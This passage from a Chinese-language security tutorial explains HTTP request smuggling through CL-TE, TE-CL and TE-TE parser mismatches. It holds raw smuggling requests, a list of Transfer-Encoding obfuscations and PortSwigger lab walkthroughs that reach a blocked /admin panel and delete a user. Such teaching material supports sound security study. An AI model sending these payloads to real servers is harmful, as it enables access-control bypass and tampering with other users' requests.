class="headerlink" title="0x02 漏洞原理"></a>0x02 漏洞原理</h1><h2 id="2-1-预备知识"><a href="#2-1-预备知识" class="headerlink" title="2.1 预备知识"></a>2.1 预备知识</h2><h3 id="2-1-1-不同版本的HTTP协议存在一定区别"><a href="#2-1-1-不同版本的HTTP协议存在一定区别" class="headerlink" title="2.1.1 不同版本的HTTP协议存在一定区别"></a>2.1.1 不同版本的HTTP协议存在一定区别</h3><table><thead><tr><th></th><th>显著特点</th><th>支持的请求方法</th><th>性能优化</th><th>泛用程度</th></tr></thead><tbody><tr><td>HTTP0.9</td><td>不支持请求头响应头，纯文本</td><td>GET</td><td></td><td>已过时</td></tr><tr><td>HTTP1.0</td><td>支持请求头响应头，超文本</td><td>GET、HEAD、POST</td><td>短链接，无优化</td><td>仍有少量使用</td></tr><tr><td>HTTP1.1</td><td>性能优化，增加请求方法</td><td>增加了OPTIONS,PUT, DELETE, TRACE, CONNECT方法</td><td>增加Keep-Alive和chunked分块传输，请求流水线等</td><td>目前使用最广泛</td></tr><tr><td>HTTP2.0</td><td>增加了二进制分帧</td><td>无变化</td><td>增加了二进制分帧层用与多路复用，通信在一个链接上进行，ServerPush</td><td>目前应用较少</td></tr></tbody></table><p>关于不同版本的HTTP协议的区别联系，可以阅读这篇知乎文章：<br><a href="https://zhuanlan.zhihu.com/p/37387316">HTTP协议几个版本的比较</a></p><p>更为完整的信息可能需要参考RFC文档中对于http协议的规定，这里给出RFC文档的地址：<br><a href="https://tools.ietf.org/rfc/">RFC文档</a><br>其中关于http1.1的规定如下：<em>RFC2068，2616，2817，7230-7235</em></p><p>我们不难发现，目前应用最广的HTTP1.1增加了Keep-alive特性，</p><blockquote><p>所谓<code>Keep-Alive</code>，就是在HTTP请求中增加一个特殊的请求头<code>Connection: Keep-Alive</code>，告诉服务器，接收完这次HTTP请求后，不要关闭TCP链接，后面对相同目标服务器的HTTP请求，重用这一个TCP链接，这样只需要进行一次TCP握手的过程，可以减少服务器的开销，节约资源，还能加快访问速度。当然，这个特性在<code>HTTP1.1</code>中是默认开启的。</p></blockquote><blockquote><p>有了<code>Keep-Alive</code>之后，后续就有了<code>Pipeline</code>，在这里呢，客户端可以像流水线一样发送自己的HTTP请求，而不需要等待服务器的响应，服务器那边接收到请求后，需要遵循先入先出机制，将请求和响应严格对应起来，再将响应发送给客户端。</p></blockquote><blockquote><p>现如今，浏览器默认是不启用<code>Pipeline</code>的，但是一般的服务器都提供了对<code>Pipleline</code>的支持。</p></blockquote><h3 id="2-1-2-Transfer-Encoding"><a href="#2-1-2-Transfer-Encoding" class="headerlink" title="2.1.2 Transfer-Encoding"></a>2.1.2 Transfer-Encoding</h3><blockquote><p> Transfer-Encoding is analogous to the Content-Transfer-Encoding field of MIME, which was designed to enable safe transport of binary data over a 7-bit transport service ([RFC2045], Section 6). However, safe transport has a different focus for an 8bit-clean transfer protocol. In HTTP’s case, Transfer-Encoding is primarily intended to accurately delimit a dynamically generated payload and to distinguish payload encodings that are only applied for transport efficiency or security from those that are characteristics of the selected resource.</p></blockquote><p>Transfer-Encoding 是一种被设计用来支持 7-bit 传输服务安全传输二进制数据的字段，有点类似于 MIME (Multipurpose Internet Mail Extensions) Header 中的 Content-Transfer-Encoding 。在HTTP的情况下，Transfer-Encoding 的主要用来以指定的编码形式编码 payload body 安全地传输给用户。在 HTTP/1.1 中引入，在 HTTP/2 中取消。</p><p><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Transfer-Encoding">MDN</a> 列举了几种属性：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chunked | compress | deflate | gzip | identity</span><br></pre></td></tr></table></figure><p>我们这里主要关注 chunked 这一种传输编码方式，它在网络攻击中也不是第一次提及了，之前就有师傅利用这个字段去绕过一些 WAF，可以参考 <a href="https://www.freebuf.com/articles/web/194351.html">利用分块传输吊打所有WAF</a>，也是比较有意思的 bypass 技巧。</p><p>我们可以在<a href="https://tools.ietf.org/html/rfc7230#section-4.1">RFC7230</a>中查看到有关分块传输的定义规范。</p><p>chunk传输数据格式如下，其中size的值由16进制表示。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[chunk size][\r\n][chunk data][\r\n][chunk size][\r\n][chunk data][\r\n][chunk size &#x3D; 0][\r\n][\r\n]</span><br></pre></td></tr></table></figure><p>举个例子就可以简单理解chunked模式下的分块传输了：<br>假设我们想通过POST传输这样的信息</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">name&#x3D;V0WKeeper</span><br></pre></td></tr></table></figure><p>正常请求是这样的：<br><img src="http://image.v0w.top/2020/12/16082671004753.jpg" alt="正常请求"><br>通过增加<code>Transfer-Encoding: chunked</code>的headers，我们可以这样传输：<br><img src="http://image.v0w.top/2020/12/16082677743329.jpg" alt="chunked"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;index.php HTTP&#x2F;1.1</span><br><span class="line">Host: localhost</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;87.0.4280.88 Safari&#x2F;537.36</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 29</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">2\r\n</span><br><span class="line">na\r\n</span><br><span class="line">c\r\n</span><br><span class="line">me&#x3D;V0WKeeper\r\n</span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure><ul><li>第一个分块：<code>\r\n</code>是CRLF，所以这里的<code>\r\n</code>是两个字节；第一个数字 2 表示<code>chunked-size</code>,是指接下来会有 2 个字节的数据(这个数字是16进制的)，也就是 <code>na</code> 这 2 个字母，然后按照 RFC 文档标准，字母 <code>na</code> 部分后面需要跟\r\n表示这个na是<code>chunk-data</code>部分</li><li>第二个分块：16进制的数字 c 后面表示<code>chunk-size</code>部分，是十六进制数表示这个分块的<code>chunk-data</code>是12字节，即<code>me=V0WKeeper</code>，之后<code>\r\n</code>表明这是<code>chunk-data</code>部分</li><li>最后有一个<code>0\r\n\r\n</code>表示分块传输结束。</li></ul><h3 id="2-1-3-CL-amp-TE-解析优先级顺序"><a href="#2-1-3-CL-amp-TE-解析优先级顺序" class="headerlink" title="2.1.3  CL &amp; TE 解析优先级顺序"></a>2.1.3  CL &amp; TE 解析优先级顺序</h3><p>CL表示Content-Length，TE表示Transfer-Encoding。那么现在有一个问题：对于 CL &amp; TE 解析是否存在优先级顺序？<br>这个在RFC中是有规定的，见 <a href="https://tools.ietf.org/html/rfc7230#section-3.3.3">RFC 7230 Message Body Length</a></p><blockquote><p> If a message is received with both a Transfer-Encoding and a Content-Length header field, the Transfer-Encoding overrides the Content-Length. Such a message might indicate an attempt to perform request smuggling (Section 9.5) or response splitting (Section 9.4) and ought to be handled as an error. A sender MUST remove the received Content-Length field prior to forwarding such a message downstream.</p></blockquote><p>虽然这里是指出了 TE 优先于 CL ，但是我们仍然可以通过一些方式绕过，又或者说，那个中间件的也没有依照这个 RFC 标准规范实现，这就导致了差异性的存在。</p><h3 id="2-1-4-Bad-Chunked-Transmission"><a href="#2-1-4-Bad-Chunked-Transmission" class="headerlink" title="2.1.4 Bad Chunked Transmission"></a>2.1.4 Bad Chunked Transmission</h3><p>根据 <a href="https://tools.ietf.org/html/rfc7230#section-3.3.3">RFC7230 section 3.3.3</a> ：</p><blockquote><p>If a Transfer-Encoding header field is present in a request and the chunked transfer coding is not the final encoding, the message body length cannot be determined reliably; the server MUST respond with the 400 (Bad Request) status code and then close the connection.</p></blockquote><p>也就是说当接受到<code>Transfer-Encoding: chunked, zorg</code>的时候，应该返回 400 错误。</p><p>这类可以有很多绕过，比如：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Transfer-Encoding: xchunked</span><br><span class="line"></span><br><span class="line">Transfer-Encoding : chunked</span><br><span class="line"></span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">Transfer-Encoding: x</span><br><span class="line"></span><br><span class="line">Transfer-Encoding:[tab]chunked</span><br><span class="line"></span><br><span class="line">GET &#x2F; HTTP&#x2F;1.1</span><br><span class="line"> Transfer-Encoding: chunked</span><br><span class="line">X: X[\n]Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">Transfer-Encoding</span><br><span class="line"> : chunked</span><br></pre></td></tr></table></figure><h3 id="2-1-5-背景"><a href="#2-1-5-背景" class="headerlink" title="2.1.5 背景"></a>2.1.5 背景</h3><p>简单的网络环境中，我们直接通过浏览器访问服务器，但是由于很多静态资源需要在服务器提供，这种方式无疑是大大增加了web服务器的负荷。</p><p>而在稍微复杂的网络环境中，为了提升用户的浏览速度，提高使用体验，减轻服务器的负担，很多网站都用上了CDN加速服务，最简单的加速服务，就是在源站的前面加上一个具有缓存功能的反向代理服务器，用户在请求某些静态资源时，直接从代理服务器中就可以获取到，不用再从源站所在服务器获取。另一方面，这个反向代理可以隐藏web服务器的真实IP，所以很多中小型网站都采用类似方案。</p><p>常见拓扑图如下：<br><img src="http://image.v0w.top/2020/12/16082085119296.jpg" alt="拓扑"></p><blockquote><p>一般来说，反向代理服务器与后端的源站服务器之间，会重用TCP链接。这也很容易理解，用户的分布范围是十分广泛，建立连接的时间也是不确定的，这样TCP链接就很难重用，而代理服务器与后端的源站服务器的IP地址是相对固定，不同用户的请求通过代理服务器与源站服务器建立链接，这两者之间的TCP链接进行重用，也就顺理成章了。</p></blockquote><blockquote><p>当我们向代理服务器发送一个比较模糊的HTTP请求时，由于两者服务器的实现方式不同，可能代理服务器认为这是一个HTTP请求，然后将其转发给了后端的源站服务器，但源站服务器经过解析处理后，只认为其中的一部分为正常请求，剩下的那一部分，就算是走私的请求，当该部分对正常用户的请求造成了影响之后，就实现了HTTP走私攻击。</p></blockquote><h2 id="2-2-原理"><a href="#2-2-原理" class="headerlink" title="2.2 原理"></a>2.2 原理</h2><p>而这个HTTP请求走私漏洞的产生正是由于：<strong>前端的反向代理服务器和后端的Web服务器，对同一个请求的理解不一致。</strong></p><p>可能是不同的服务器对RFC标准实现的方式不同，程度不同，配置不同等等。这样一来，对同一个HTTP请求，不同的服务器可能会产生不同的处理结果，这样就产生了了安全风险。</p><p><img src="http://image.v0w.top/2020/12/16082608974438.jpg" alt="原理"><br>如上图，一段时间内有很多用户访问这个网站，其中一个攻击者，恶意构造一个请求，这个请求在前端服务器的理解是两个请求，而后端服务器理解是一个请求和一个不完整的请求，于是会继续等待，等待到正常用户的访问，将其拼接起来，然后认为这个拼接的请求是一个完整的请求，之后对其响应。</p><p>直接说原理可能太抽象了，我们通过几个例子，刚好了解这种攻击方式的多种情形，也可以具体感受一下HTTP请求走私攻击原理。</p><p>根据破坏请求的方式不同，一般将HTTP走私分为几种不同的情形（CL:Content-Length, TE:Transfer-Encoding）：</p><ul><li>CL!=0</li><li>CL-CL</li><li>CL-TE</li><li>TE-CL</li><li>TE-TE</li></ul><h2 id="2-3-CL-0"><a href="#2-3-CL-0" class="headerlink" title="2.3 CL!=0"></a>2.3 CL!=0</h2><p>其实在这里，影响到的并不仅仅是GET请求，所有不携带请求体的HTTP请求都有可能受此影响，只因为GET比较典型，我们把它作为一个例子。</p><p>在<code>RFC2616</code>中，没有对GET请求像POST请求那样携带请求体做出规定，在最新的<code>RFC7231</code>的4.3.1节中也仅仅提了一句。</p><blockquote><p><a href="https://tools.ietf.org/html/rfc7231#section-4.3.1">https://tools.ietf.org/html/rfc7231#section-4.3.1</a></p><p>sending a payload body on a GET request might cause some existing implementations to reject the request</p></blockquote><p>假设前端代理服务器允许GET请求携带请求体，而后端服务器不允许GET请求携带请求体，它会直接忽略掉GET请求中的<code>Content-Length</code>头，不进行处理。这就有可能导致请求走私。</p><p>比如我们构造请求</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F; HTTP&#x2F;1.1\r\n</span><br><span class="line">Host: example.com\r\n</span><br><span class="line">Content-Length: 44\r\n</span><br><span class="line"></span><br><span class="line">GET &#x2F; secret HTTP&#x2F;1.1\r\n</span><br><span class="line">Host: example.com\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure><p>前端服务器收到该请求，通过读取<code>Content-Length</code>，判断这是一个完整的请求，然后转发给后端服务器，而后端服务器收到后，因为它不对<code>Content-Length</code>进行处理，由于<code>Pipeline</code>的存在，它就认为这是收到了两个请求，分别是</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">第一个</span><br><span class="line">GET &#x2F; HTTP&#x2F;1.1\r\n</span><br><span class="line">Host: example.com\r\n</span><br><span class="line"></span><br><span class="line">第二个</span><br><span class="line">GET &#x2F; secret HTTP&#x2F;1.1\r\n</span><br><span class="line">Host: example.com\r\n</span><br></pre></td></tr></table></figure><p>这就导致了请求走私。</p><h2 id="2-4-CL-CL"><a href="#2-4-CL-CL" class="headerlink" title="2.4 CL-CL"></a>2.4 CL-CL</h2><p>在<code>RFC7230</code>的第<code>3.3.3</code>节中的第四条中，规定当服务器收到的请求中包含两个<code>Content-Length</code>，而且两者的值不同时，需要返回400错误。</p><blockquote><p><a href="https://tools.ietf.org/html/rfc7230#section-3.3.3">https://tools.ietf.org/html/rfc7230#section-3.3.3</a></p></blockquote><p>但是总有服务器不会严格的实现该规范，假设中间的代理服务器和后端的源站服务器在收到类似的请求时，都不会返回400错误，但是中间代理服务器按照第一个<code>Content-Length</code>的值对请求进行处理，而后端源站服务器按照第二个<code>Content-Length</code>的值进行处理。</p><p>此时恶意攻击者可以构造一个特殊的请求</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1\r\n</span><br><span class="line">Host: example.com\r\n</span><br><span class="line">Content-Length: 8\r\n</span><br><span class="line">Content-Length: 7\r\n</span><br><span class="line"></span><br><span class="line">12345\r\n</span><br><span class="line">a</span><br></pre></td></tr></table></figure><p>中间代理服务器获取到的数据包的长度为8，将上述整个数据包原封不动的转发给后端的源站服务器，而后端服务器获取到的数据包长度为7。当读取完前7个字符后，后端服务器认为已经读取完毕，然后生成对应的响应，发送出去。而此时的缓冲区去还剩余一个字母<code>a</code>，对于后端服务器来说，这个<code>a</code>是下一个请求的一部分，但是还没有传输完毕。此时恰巧有一个其他的正常用户对服务器进行了请求，假设请求如图所示。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F;index.html HTTP&#x2F;1.1\r\n</span><br><span class="line">Host: example.com\r\n</span><br></pre></td></tr></table></figure><p>从前面我们也知道了，代理服务器与源站服务器之间一般会重用TCP连接。<br>这时候正常用户的请求就拼接到了字母<code>a</code>的后面，当后端服务器接收完毕后，它实际处理的请求其实是</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">aGET &#x2F;index.html HTTP&#x2F;1.1\r\n</span><br><span class="line">Host: example.com\r\n</span><br></pre></td></tr></table></figure><p>这时候用户就会收到一个类似于<code>aGET request method not found</code>的报错。这样就实现了一次HTTP走私攻击，而且还对正常用户的行为造成了影响，而且后续可以扩展成类似于CSRF的攻击方式。</p><h2 id="2-5-CL-TE"><a href="#2-5-CL-TE" class="headerlink" title="2.5 CL-TE"></a>2.5 CL-TE</h2><p>两个<code>Content-Length</code>这种请求包对于服务器的要求还是太过于理想化了，一般的服务器都不会接受这种存在两个请求头的请求包。但是在<code>RFC2616</code>的第4.4节中，规定:<strong>如果收到同时存在Content-Length和Transfer-Encoding这两个请求头的请求包时，在处理的时候必须忽略Content-Length</strong>，这其实也就意味着请求包中同时包含这两个请求头并不算违规，服务器也不需要返回<code>400</code>错误。服务器在这里的实现更容易出问题。</p><blockquote><p><a href="https://tools.ietf.org/html/rfc2616#section-4.4">https://tools.ietf.org/html/rfc2616#section-4.4</a></p></blockquote><p>所谓<code>CL-TE</code>，就是当收到存在两个请求头的请求包时，前端代理服务器只处理<code>Content-Length</code>这一请求头，而后端服务器会遵守<code>RFC2616</code>的规定，忽略掉<code>Content-Length</code>，处理<code>Transfer-Encoding</code>这一请求头。</p><p>Lab 地址：<a href="https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te">https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te</a></p><p>构造数据包</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: ac761f1a1e9fe92e80372867004e0068.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;87.0.4280.88 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Cookie: session&#x3D;fblq0y8FiGcc5K6mSs2HTdfWzGRhTjgz</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Length: 6</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br><span class="line">a</span><br></pre></td></tr></table></figure><p>连续发送几次请求就可以获得该响应。<br><img src="http://image.v0w.top/2020/12/16082046342269.jpg" alt="CL-TE"></p><p>由于前端服务器处理<code>Content-Length</code>，所以这个请求对于它来说是一个完整的请求，请求体的长度为6，也就是</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0\r\n</span><br><span class="line">\r\n</span><br><span class="line">a</span><br></pre></td></tr></table></figure><p>当请求包经过代理服务器转发给后端服务器时，后端服务器处理<code>Transfer-Encoding</code>，当它读取到<code>0\r\n\r\n</code>时，认为已经读取到结尾了，但是剩下的字母<code>a</code>就被留在了缓冲区中，等待后续请求的到来。当我们重复发送请求后，发送的请求在后端服务器拼接成了类似下面这种请求。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">aPOST &#x2F; HTTP&#x2F;1.1\r\n</span><br><span class="line">Host: ac761f1a1e9fe92e80372867004e0068.web-security-academy.net\r\n</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>服务器在解析时当然会产生报错了。</p><h2 id="2-6-TE-CL"><a href="#2-6-TE-CL" class="headerlink" title="2.6 TE-CL"></a>2.6 TE-CL</h2><p>所谓<code>TE-CL</code>，就是当收到存在两个请求头的请求包时，前端代理服务器处理<code>Transfer-Encoding</code>这一请求头，而后端服务器处理<code>Content-Length</code>请求头。</p><p>Lab地址：<a href="https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl">https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl</a></p><p>构造数据包</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: ac7f1f571fe9f64580263276002a0013.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;87.0.4280.88 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9,en;q&#x3D;0.8</span><br><span class="line">Cookie: session&#x3D;GklnleINICe4bVWmOboLzzums1ppdes2</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 4</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">12\r\n</span><br><span class="line">GPOST &#x2F; HTTP&#x2F;1.1\r\n</span><br><span class="line">\r\n</span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure><p>可以在这里设置<strong>是否自动更新</strong>，我们在测试HTTPsmuggling的时候往往需要关闭Content-Length的自动更新。<br><img src="http://image.v0w.top/2020/12/16082713958441.jpg" alt="取消自动更新Content-Length"></p><p><img src="http://image.v0w.top/2020/12/16082714994032.jpg" alt="TE-CL"></p><p>由于前端服务器处理<code>Transfer-Encoding</code>，当其读取到<code>0\r\n\r\n</code>时，认为是读取完毕了，此时这个请求对代理服务器来说是一个完整的请求，然后转发给后端服务器，后端服务器处理<code>Content-Length</code>请求头，当它读取完<code>12\r\n</code>之后，就认为这个请求已经结束了，后面的数据就认为是另一个请求了，也就是</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GPOST &#x2F; HTTP&#x2F;1.1\r\n</span><br><span class="line">\r\n</span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure><p>成功报错。</p><h2 id="2-7-TE-TE"><a href="#2-7-TE-TE" class="headerlink" title="2.7 TE-TE"></a>2.7 TE-TE</h2><p><code>TE-TE</code>，也很容易理解，当收到存在两个请求头的请求包时，前后端服务器都处理<code>Transfer-Encoding</code>请求头，这确实是实现了RFC的标准。不过前后端服务器毕竟不是同一种，这就有了一种方法，我们可以对发送的请求包中的<code>Transfer-Encoding</code>进行某种混淆操作，从而使其中一个服务器不处理<code>Transfer-Encoding</code>请求头。从某种意义上还是<code>CL-TE</code>或者<code>TE-CL</code>。</p><p>Lab地址：<a href="https://portswigger.net/web-security/request-smuggling/lab-ofuscating-te-header">https://portswigger.net/web-security/request-smuggling/lab-ofuscating-te-header</a></p><p>构造数据包</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: ac991f181e14509a80e729a500980063.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;87.0.4280.88 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9,en;q&#x3D;0.8</span><br><span class="line">Cookie: session&#x3D;CopStl0xBmPNLqkRBoRYmmr48VDokDv3</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 4</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Transfer-encoding: anyinvaild</span><br><span class="line">\r\n</span><br><span class="line">5c\r\n</span><br><span class="line">GPOST &#x2F; HTTP&#x2F;1.1\r\n</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded\r\n</span><br><span class="line">Content-Length: 15\r\n</span><br><span class="line">\r\n</span><br><span class="line">x&#x3D;1\r\n</span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure><p><img src="http://image.v0w.top/2020/12/16082721386354.jpg" alt="TE-TE"></p><h1 id="0x03-攻击方式-amp-危害"><a href="#0x03-攻击方式-amp-危害" class="headerlink" title="0x03 攻击方式&amp;危害"></a>0x03 攻击方式&amp;危害</h1><h2 id="3-1-bypass-front-end-security-controls-portswigger"><a href="#3-1-bypass-front-end-security-controls-portswigger" class="headerlink" title="3.1 bypass front-end security controls-portswigger"></a>3.1 bypass front-end security controls-portswigger</h2><p>这里提供了两个实验环境，一个是 CL-TE 形式的 <a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te">Lab: Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability</a> ，一个是TE-CL 形式的 <a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-te-cl">Lab: Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability</a>，两个实验最终达到的目的一样，这里我们随便选用 CL-TE 的来进行实验。</p><blockquote><p> This lab involves a front-end and back-end server, and the front-end server doesn’t support chunked encoding. There’s an admin panel at /admin, but the front-end server blocks access to it.</p><p>To solve the lab, smuggle a request to the back-end server that accesses the admin panel and deletes the user carlos.</p></blockquote><p>架构和之前提到是CL-TE实验一样，只不过这次我们需要去利用 HTTP Smuggling 获取 admin 权限并删除 carlos 用户。</p><p>我们生成 LAB 之后，直接访问<code>/admin</code>会发现 <code>&quot;Path /admin is blocked&quot;</code>，看来不能通过正常方式访问<code>/admin</code>，或者是有什么限制，但是我们不知道限制是什么。那我们尝试 HTTP Smuggling 的方式，发送如下数据包两次，就能看到限制是什么：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: acbd1fa91ed6894e8031d60d00f5009c.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;87.0.4280.88 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9,en;q&#x3D;0.8</span><br><span class="line">Cookie: session&#x3D;B1AUoiKqAaOP8ipBE9Vf5d2pAxm7ToxS</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 28</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">\r\n</span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br><span class="line">GET &#x2F;admin HTTP&#x2F;1.1\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure><p><img src="http://image.v0w.top/2020/12/16082734980370.jpg" alt="smuggling看安全限制"></p><p>增加<code>Host: localhost</code></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: acbd1fa91ed6894e8031d60d00f5009c.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;87.0.4280.88 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9,en;q&#x3D;0.8</span><br><span class="line">Cookie: session&#x3D;B1AUoiKqAaOP8ipBE9Vf5d2pAxm7ToxS</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 45</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">\r\n</span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br><span class="line">GET &#x2F;admin HTTP&#x2F;1.1\r\n</span><br><span class="line">Host: localhost\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure><p><img src="http://image.v0w.top/2020/12/16082737690822.jpg" alt="发现删除的接口"><br>构造删除接口，删除carlos账户</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: acbd1fa91ed6894e8031d60d00f5009c.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;87.0.4280.88 Safari&#x2F;537.36</span><br><span class="line">Cookie: session&#x3D;B1AUoiKqAaOP8ipBE9Vf5d2pAxm7ToxS</span><br><span class="line">Content-Type: text&#x2F;html; application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 68</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">\r\n</span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br><span class="line">GET &#x2F;admin&#x2F;delete?username&#x3D;carlos HTTP&#x2F;1.1\r\n</span><br><span class="line">Host: localhost\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure><p><img src="http://image.v0w.top/2020/12/16082753625634.jpg" alt="删除成功"></p><p>这种攻击方式类似 HTTP SSRF ，主要的点就是在控制 CL 数值上，比如说第一个数据包 CL 的值为 28 ，是这么计算的：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\r\n                            --&gt; POST data需要空一行，不计数</span><br><span class="line">0\r\n                           --&gt; 3个字节</span><br><span class="line">\r\n                            --&gt; 2个字节</span><br><span class="line">GET &#x2F;admin HTTP&#x2F;1.1\r\n         --&gt; 19+2 &#x3D; 21 个字节</span><br><span class="line">\r\n                            --&gt; 2个字节</span><br><span class="line">所以这么结算下来就是 3+2+21+2 &#x3D; 28字节。</span><br></pre></td></tr></table></figure><p>TE-CL 